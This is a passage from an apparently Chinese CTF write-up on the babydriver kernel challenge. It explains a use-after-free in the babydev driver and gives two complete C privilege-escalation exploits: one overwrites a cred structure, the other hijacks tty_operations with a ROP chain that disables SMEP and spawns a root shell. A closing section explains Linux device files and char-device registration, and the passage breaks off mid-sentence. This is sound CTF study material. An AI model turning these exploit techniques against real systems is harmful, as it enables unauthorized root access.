title="细节问题"></a>细节问题</h3><p>本题fops结构体,ida显示并未注册babyrelease函数,但真正做题的时候发现是注册了的</p><p>一开始很困惑,以为是什么特殊的机制,最后发现babyrelease的函数位置就是0</p><p>也就是说本来是注册了的,但是因为值刚好是0,ida看不出来,才显示未注册</p><p>并且更进一步可以得到,所有未注册的函数最终都默认注册babyrelease因为未注册就显示NULL,而babyrelease就是null(0)</p><p>不过也仅限这题了</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>观察到babyrelease函数只是free,并没有置零且存储chunk的指针是全局变量</p><p>如果我们同时打开两个babydev设备文件</p><p>并将其中一个释放那么就可以uaf了,那如何利用这个uaf</p><h3 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a><strong>思路1</strong></h3><p><strong>此种方法在较新版本 kernel 中已不可行，我们已无法直接分配到 cred_jar 中的 object</strong>，这是因为 cred_jar 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时（默认开启）<strong>cred_jar 不会再与相同大小的 kmalloc-192 进行合并</strong></p><p>但在本题版本可以分配到刚才释放的chunk</p><p>因此可以伪造cred结构体,修改权限</p><p>并fork一个程序</p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> device1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> device2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">ioctl(device1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line">close(device1);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> new_process_pid = fork();</span><br><span class="line"><span class="keyword">if</span> (new_process_pid &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] fork error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (new_process_pid == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> lots_zero[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">write(device2, lots_zero, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] got root&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">close(device2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h3><p>同样是利用uaf</p><p>不过这次利用的是在 <code>/dev</code> 下有一个伪终端设备 <code>ptmx</code> ，在我们打开这个设备时内核中会创建一个 <code>tty_struct</code> 结构体，与其他类型设备相同，tty 驱动设备中同样存在着一个存放着函数指针的结构体 <code>tty_operations</code>。</p><p>tty_struct的size是0x2e0</p><p>利用uaf我们可以劫持其中的tty_operations函数指针</p><p>那么在我们对这个设备进行相应操作（如 write、ioctl）时便会执行我们布置好的恶意函数指针。</p><p>由于没有开启 SMAP 保护，故我们可以在用户态进程的栈上布置 ROP 链与 <code>fake tty_operations</code> 结构体。</p><p>使用 gdb 进行调试，观察内核在调用我们的恶意函数指针时各寄存器的值，我们在这里选择劫持 <code>tty_operaionts</code> 结构体到用户态的栈上，并选择任意一条内核 gadget 作为 fake tty 函数指针以方便下断点：</p><p>这段调试可能有点难理解,即劫持tty_ops的函数表为内核上的任意可区分代码,这样我们在调试时可以在对应的位置下断点,以观察当前的上下文环境</p><p>我们不难观察到，在我们调用<code>tty_operations-&gt;write</code>时，<strong>其 rax 寄存器中存放的便是 tty_operations 结构体的地址</strong>，因此若是我们能够在内核中找到形如<code>mov rsp, rax</code>的 gadget，便能够成功地将栈迁移到<code>tty_operations</code>结构体的开头。</p><p>使用 ROPgadget 查找相关 gadget，发现有两条符合我们要求的 gadget：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/figure/ttygadget.png" alt="image.png"></p><p>gdb 调试，发现第一条 gadget 其实等价于<code>mov rsp, rax ; dec ebx ; ret</code>：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/figure/ttygadget2.png" alt="image.png"></p><p>那么利用这条 gadget 我们便可以很好地完成栈迁移的过程，执行我们所构造的 ROP 链。</p><p>而<code>tty_operations</code>结构体开头到其 write 指针间的空间较小,直接在此处rop显然是行不通的(与write指针冲突)，因此我们还需要进行二次栈迁移，这里随便选一条改 rax 的 gadget 即可：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/figure/ttygadget3.png" alt="image.png"></p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810d238d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX_RET 0xffffffff8100ce6e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff81063694</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ_RET 0xffffffff814e35ef</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="literal">NULL</span>, prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootPrivilige</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> * (*prepare_kernel_cred_ptr)(<span class="type">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*commit_creds_ptr)(<span class="type">void</span> *) = commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get the addr</span></span><br><span class="line">    FILE* sym_table_fd = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(sym_table_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;commit_creds&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            commit_creds = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            prepare_kernel_cred = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x20</span>], p = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = POP_RDI_RET;</span><br><span class="line">    rop[p++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[p++] = MOV_CR4_RDI_POP_RBP_RET;</span><br><span class="line">    rop[p++] = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = getRootPrivilige;</span><br><span class="line">    rop[p++] = SWAPGS_POP_RBP_RET;</span><br><span class="line">    rop[p++] = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = IRETQ_RET;</span><br><span class="line">    rop[p++] = getRootShell;</span><br><span class="line">    rop[p++] = user_cs;</span><br><span class="line">    rop[p++] = user_rflags;</span><br><span class="line">    rop[p++] = user_sp;</span><br><span class="line">    rop[p++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_op[<span class="number">0x30</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;</span><br><span class="line"></span><br><span class="line">    fake_op[<span class="number">0</span>] = POP_RAX_RET;</span><br><span class="line">    fake_op[<span class="number">1</span>] = rop;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_tty[<span class="number">0x20</span>];</span><br><span class="line">    <span class="type">int</span> fd3 = open(<span class="string">&quot;/dev/ptmx&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    read(fd2, fake_tty, <span class="number">0x40</span>);<span class="comment">//这一步为什么要read??因为下一步写的时候要从开头写,如果直接填充到ops的话,那么中间很多重要信息就被覆盖了,所以先将原本的信息读出来,等会填充的时候就用这个填充,保证开头到目标之间的内容不被改变</span></span><br><span class="line">    fake_tty[<span class="number">3</span>] = fake_op;</span><br><span class="line">    write(fd2, fake_tty, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    write(fd3, buf, <span class="number">0x8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺带一提,本题覆盖cr4寄存器取消了smep保护,那么在获得了commint_creds和prepare_kernel_cred的地址后可以直接用户空间代码调用提权,最后着陆用户态spawn一个shell</p><h2 id="延拓"><a href="#延拓" class="headerlink" title="延拓"></a>延拓</h2><h3 id="dev"><a href="#dev" class="headerlink" title="/dev"></a>/dev</h3><p>在Linux系统中，<code>/dev</code> 目录是一个特殊的目录，它包含了设备文件（device files）。设备文件是用于访问系统硬件设备或与内核通信的一种方式。<code>/dev</code> 目录中的设备文件允许用户和应用程序通过文件I/O的方式与硬件设备进行交互，这种文件I/O操作被视为与设备的输入输出（I/O）交互。</p><p>这些设备文件包括以下几类</p><p><strong>字符设备</strong></p><p><em>字符设备</em>是指每次与系统传输1个字符的设备。这些设备节点通常为传真,虚拟终端和串口调制解调器之类设备提供流通信服务，它通常不支持随机存取数据。</p><p>字符设备在实现时，大多不使用缓存器。系统直接从设备读取／写入每一个字符。</p><p><strong>块设备</strong></p><p><em>块设备</em>是指与系统间用块的方式移动数据的设备。这些设备节点通常代表可寻址设备，如硬盘、CD-ROM和内存区域。</p><p>块设备通常支持随机存取和寻址，并使用缓存器。操作系统为输入输出分配了缓存以存储一块数据。当程序向设备发送了读取或者写入数据的请求时，系统把数据中的每一个字符存储在适当的缓存中。当缓存被填满时，会采取适当的操作（把数据传走），而后系统清空缓存。</p><p><strong>伪设备</strong></p><p>在类Unix操作系统中，设备节点并不一定要对应物理设备。没有这种对应关系的设备是<em>伪设备</em>。操作系统运用了它们提供的多种功能。部分经常使用到的伪设备包括：</p><ul><li><p><code>/dev/null</code></p><p>接受并丢弃所有输入；即不产生任何输出。</p></li><li><p><code>/dev/full</code></p><p>永远在被填满状态的设备。</p></li><li><p><code>/dev/loop</code></p><p>Loop设备</p></li><li><p><code>/dev/zero</code></p><p>产生连续的NUL字符的流(数值为0)。</p></li><li><p><code>/dev/random</code></p><p>产生一个虚假随机的任意长度字符流。(Blocking)</p></li><li><p><code>/dev/urandom</code></p><p>产生一个虚假随机的任意长度字符流。(Non-Blocking)</p></li></ul><h3 id="dev-init"><a href="#dev-init" class="headerlink" title="dev_init"></a>dev_init</h3><p>简易分析下babydriver中出现的dev模块注册</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">babydriver_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v2</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0LL</span>, <span class="number">1LL</span>, <span class="string">&quot;babydev&quot;</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">    cdev_0.owner = &amp;_this_module;</span><br><span class="line">    v1 = cdev_add(&amp;cdev_0, babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (class *)_class_create(&amp;_this_module, <span class="string">&quot;babydev&quot;</span>, &amp;babydev_no);</span><br><span class="line">      babydev_class = v2;</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = device_create(v2, <span class="number">0LL</span>, babydev_no, <span class="number">0LL</span>, <span class="string">&quot;babydev&quot;</span>);</span><br><span class="line">        v0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">          <span class="keyword">return</span> v0;</span><br><span class="line">        printk(&amp;unk_351);</span><br><span class="line">        class_destroy(babydev_class);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_33B);</span><br><span class="line">      &#125;</span><br><span class="line">      cdev_del(&amp;cdev_0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_327);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(&amp;unk_309);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="alloc-chrdev-region"><a href="#alloc-chrdev-region" class="headerlink" title="alloc_chrdev_region"></a>alloc_chrdev_region</h4><p>首先出现的是alloc_chrdev_region函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">alloc_chrdev_region</span><span class="params">(<span class="type">dev_t</span> *dev, <span class="type">unsigned</span> baseminor, <span class="type">unsigned</span> count,</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">char_device_struct</span> *<span class="title">cd</span>;</span></span><br><span class="line">cd = __register_chrdev_region(<span class="number">0</span>, baseminor, count, name);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(cd))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(cd);</span><br><span class="line">*dev = MKDEV(cd-&gt;major, cd-&gt;baseminor);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>alloc_chrdev_region</code> 是Linux内核中用于动态分配字符设备号的函数。在Linux系统中，字符设备是一种用于与字符设备驱动程序通信的设备类型，例如终端设备、串口设备等。每个字符设备都有一个唯一的设备号，该设备号由主设备号和次设备号组成。</p><p>参数说明：</p><ul><li><code>dev</code>：用于存储分配的设备号范围的变量（包括主设备号和起始的次设备号）。</li><li><code>baseminor</code>：起始的次设备号。</li><li><code>count</code>：要分配的设备号数量。</li><li><code>name</code>：设备名称，用于在<code>/proc/devices</code>中标识设备。</li></ul><p>对应的逆操作函数是<strong>unregister_chrdev_region</strong></p><h4 id="cdev-init"><a href="#cdev-init" class="headerlink" title="cdev_init"></a>cdev_init</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cdev_init</span><span class="params">(<span class="keyword">struct</span> cdev *cdev, <span class="type">const</span> <span class="keyword">struct</span> file_operations *fops)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(cdev, <span class="number">0</span>, <span class="keyword">sizeof</span> *cdev);</span><br><span class="line">INIT_LIST_HEAD(&amp;cdev-&gt;<span class="built_in">list</span>);</span><br><span class="line">kobject_init(&amp;cdev-&gt;kobj, &amp;ktype_cdev_default);</span><br><span class="line">cdev-&gt;ops = fops;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cdev_init</code> 函数的作用是初始化字符设备结构体 <code>cdev</code>。在Linux内核编程中，<code>cdev</code> 结构体代表字符设备，并通过该结构体来向内核注册字符设备。</p><p>参数说明：</p><ul><li><code>cdev</code>：要初始化的字符设备结构体。</li><li><code>fops</code>：与该字符设备关联的文件操作结构体，其中包含了指向驱动程序定义的处理函数的指针</li></ul><h4 id="cdev-add"><a href="#cdev-add" class="headerlink" title="cdev_add"></a>cdev_add</h4><p><code>cdev_add</code> 函数是Linux内核中用于向内核注册字符设备的函数。在使用字符设备时，首先需要创建并初始化 <code>struct cdev</code> 结构体，然后通过 <code>cdev_add</code> 将其注册到内核中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cdev_add</span><span class="params">(<span class="keyword">struct</span> cdev *p, <span class="type">dev_t</span> dev, <span class="type">unsigned</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">p-&gt;dev = dev;</span><br><span class="line">p-&gt;count = count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WARN_ON(dev == WHITEOUT_DEV)) &#123;</span><br><span class="line">error = -EBUSY;</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">error = kobj_map(cdev_map, dev, count, <span class="literal">NULL</span>,</span><br><span class="line"> exact_match, exact_lock, p);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">kobject_get(p-&gt;kobj.parent);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err:</span><br><span class="line">kfree_const(p-&gt;kobj.name);</span><br><span class="line">p-&gt;kobj.name = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>p</code>：指向 <code>struct cdev</code> 